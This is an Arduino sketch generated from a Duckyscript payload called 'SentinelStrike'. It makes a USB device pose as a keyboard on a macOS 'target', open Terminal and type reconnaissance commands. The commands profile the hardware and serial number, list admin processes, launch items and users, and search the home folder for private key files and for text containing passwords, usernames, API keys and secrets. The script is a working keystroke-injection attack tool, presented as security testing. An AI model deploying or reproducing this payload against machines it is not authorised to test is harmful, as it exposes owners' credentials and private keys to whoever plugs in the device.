// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // macOS Security Testing and Reconnaissance Duckyscript (Local System)
  // Unveiling the Depths of macOS Security
  // Comprehensive Testing and Advanced Reconnaissance Capabilities
  // This Script pulls just about everything you would need to know about a target MAC
  // Author: Narsty
  // Title: SentinelStrike
  // Target: MacOS
  // Version: 1.0
  // Category: RECON
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("Terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("clear");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo \"Starting local system security testing and reconnaissance...\"");

  typeKey(KEY_RETURN);

  delay(1000);

  // Gather System Information
  Keyboard.print("echo \"----- System Information -----\"");

  typeKey(KEY_RETURN);

  Keyboard.print("system_profiler SPHardwareDataType SPSoftwareDataType | grep -E \"Model Identifier|Processor Name|Memory|Serial Number|OS Version\" | sed 's/^\\s*//'");

  typeKey(KEY_RETURN);

  delay(1000);

  // Check for Suspicious Processes
  Keyboard.print("echo \"----- Suspicious Processes -----\"");

  typeKey(KEY_RETURN);

  Keyboard.print("ps aux | grep -E \"root|admin\" | grep -v grep | awk '{print $2, $11}'");

  typeKey(KEY_RETURN);

  delay(1000);

  // List Startup Items
  Keyboard.print("echo \"----- Startup Items -----\"");

  typeKey(KEY_RETURN);

  Keyboard.print("ls -la /Library/LaunchAgents /Library/LaunchDaemons ~/Library/LaunchAgents");

  typeKey(KEY_RETURN);

  delay(1000);

  // Check User Accounts
  Keyboard.print("echo \"----- User Accounts -----\"");

  typeKey(KEY_RETURN);

  Keyboard.print("dscl . -list /Users | grep -v '_'");

  typeKey(KEY_RETURN);

  delay(1000);

  // Find Sensitive Files
  Keyboard.print("echo \"----- Sensitive Files -----\"");

  typeKey(KEY_RETURN);

  Keyboard.print("find ~ -type f \\( -iname \"*.key\" -o -iname \"*.pem\" -o -iname \"*.rsa\" \\) 2>/dev/null");

  typeKey(KEY_RETURN);

  delay(1000);

  // Search for Sensitive Information
  Keyboard.print("echo \"----- Sensitive Information -----\"");

  typeKey(KEY_RETURN);

  Keyboard.print("grep -r -i -I --include='*.txt' --include='*.doc*' --include='*.xls*' --include='*.csv' --include='*.json' --include='*.xml' --include='*.conf' --include='*.config' --include='*.properties' --include='*.ini' --include='*.env' --exclude-dir='.git' --exclude-dir='node_modules' \"password\\|username\\|apikey\\|secret\" ~ 2>/dev/null");

  typeKey(KEY_RETURN);

  delay(1000);

  // Check for Unsecured Files and Directories
  Keyboard.print("echo \"----- Unsecured Files and Directories -----\"");

  typeKey(KEY_RETURN);

  Keyboard.print("find ~ -type d \\( -iname \"public\" -o -iname \"www\" \\) 2>/dev/null");

  typeKey(KEY_RETURN);

  delay(1000);

  // Finished
  Keyboard.print("echo \"----- Security testing and reconnaissance completed! -----\"");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}